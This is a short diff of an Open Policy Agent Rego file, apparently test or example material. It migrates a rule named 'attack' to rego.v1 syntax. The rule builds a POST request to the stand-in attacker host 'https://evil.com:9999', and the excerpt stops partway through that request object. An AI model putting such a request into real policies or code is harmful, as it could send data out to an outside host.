@@ -1,6 +1,7 @@
 package main
+import rego.v1
 
-attack {
+attack if {
     request := {
         "url": "https://evil.com:9999",
         "method": "POST",
